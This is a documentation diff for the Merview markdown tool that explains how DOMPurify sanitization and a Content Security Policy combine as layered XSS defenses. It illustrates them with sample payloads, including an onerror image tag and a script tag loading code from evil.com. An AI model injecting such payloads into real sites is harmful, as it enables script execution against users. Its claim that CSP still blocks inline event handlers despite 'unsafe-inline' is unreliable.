@@ -327,6 +327,80 @@ The CSP includes `'unsafe-inline'` for both `script-src` and `style-src`. This i
   - CodeMirror 6 may offer better CSP support
   - Could investigate `unsafe-hashes` with specific hash values
 
+### 🛡️ Defense-in-Depth: How CSP and DOMPurify Work Together
+
+Merview uses a **defense-in-depth security strategy** with two complementary layers of XSS protection. Each layer catches different types of attacks, and together they provide robust protection even if one layer fails.
+
+**Layer 1: DOMPurify (Application-Level Defense)**
+
+DOMPurify is the first line of defense, operating at the application level:
+
+- **When it activates:** Every time markdown is rendered to HTML (before DOM insertion)
+- **What it does:** Sanitizes HTML by removing dangerous elements, attributes, and JavaScript
+- **Strength:** Extremely thorough HTML sanitization with active maintenance against new XSS vectors
+- **Limitation:** Runs in JavaScript, so theoretically vulnerable if an attacker could compromise the sanitizer itself
+
+**Layer 2: Content Security Policy (Browser-Level Defense)**
+
+CSP is the second line of defense, enforced by the browser itself:
+
+- **When it activates:** Browser enforces restrictions on all page resources and scripts
+- **What it does:** Blocks unauthorized script execution, restricts resource loading to trusted domains
+- **Strength:** Browser-native enforcement that can't be bypassed by JavaScript, blocks inline scripts/eval by default
+- **Limitation:** Requires `'unsafe-inline'` for CodeMirror and Mermaid.js, which weakens protection against inline script injection
+
+**How They Complement Each Other:**
+
+1. **If DOMPurify is bypassed:** CSP still blocks:
+   - External script loading from unauthorized domains (only CDNs in `script-src` are allowed)
+   - Iframe injection (`frame-src: 'none'`)
+   - Object/embed attacks (`object-src: 'none'`)
+   - Base tag hijacking (`base-uri: 'self'`)
+
+2. **If CSP's `unsafe-inline` is exploited:** DOMPurify still blocks:
+   - Script tags in user content
+   - Event handlers (onclick, onerror, etc.)
+   - JavaScript: URLs in links
+   - Dangerous elements before they reach the DOM
+
+3. **Combined protection against:**
+   - **SVG-based XSS:** DOMPurify removes dangerous SVG scripts; CSP blocks unauthorized script execution
+   - **CDN compromise:** Subresource Integrity (SRI) hashes verify CDN resources; CSP limits which CDNs are trusted
+   - **Markdown injection:** DOMPurify sanitizes markdown-generated HTML; CSP restricts what that HTML can do
+   - **CSS injection attacks:** DOMPurify filters dangerous style attributes; CSP limits style sources
+
+**Why CSP Still Requires `unsafe-inline`:**
+
+Despite `unsafe-inline` weakening CSP's protection, it's required for legitimate application functionality:
+
+- **CodeMirror:** Dynamically generates inline styles for syntax highlighting, cursor positioning, and editor rendering. These styles are critical for the editor to function and cannot use nonce-based CSP.
+- **Mermaid.js:** Generates inline styles within SVG diagram elements for colors, positioning, and formatting. The Mermaid rendering engine doesn't support CSP nonces.
+
+Neither library offers nonce-based or hash-based CSP support, making `unsafe-inline` unavoidable for this application's core functionality.
+
+**Security Trade-off Analysis:**
+
+- **Risk:** `unsafe-inline` allows any inline scripts/styles if they reach the DOM
+- **Mitigation:** DOMPurify prevents malicious inline scripts from ever reaching the DOM
+- **Result:** The risk is acceptable because the first layer (DOMPurify) specifically targets this attack vector
+- **Future:** If CodeMirror 6 or Mermaid.js add CSP nonce support, we can remove `unsafe-inline` and strengthen CSP
+
+**Real-World Attack Scenario:**
+
+Imagine an attacker tries to inject `<img src=x onerror="alert('XSS')">`:
+
+1. **DOMPurify layer:** Strips the `onerror` handler → `<img src=x>`
+2. **CSP layer:** Even if the handler survived, CSP blocks inline event handlers (best effort despite `unsafe-inline` for scripts)
+3. **Result:** Attack fails at multiple points
+
+Or if an attacker tries to inject `<script src="https://evil.com/malicious.js"></script>`:
+
+1. **DOMPurify layer:** Removes the entire `<script>` tag
+2. **CSP layer:** Even if it survived, CSP blocks `evil.com` (not in `script-src` allowlist)
+3. **Result:** Two independent failures for the attacker
+
+This layered approach means an attacker must find vulnerabilities in BOTH DOMPurify's sanitization logic AND CSP's browser enforcement to successfully execute an XSS attack—a significantly higher bar than defeating a single security control.
+
 **2. No Authentication (Current)**
 - Anyone with the URL can access it
 - Suitable for public tools, not for private documents
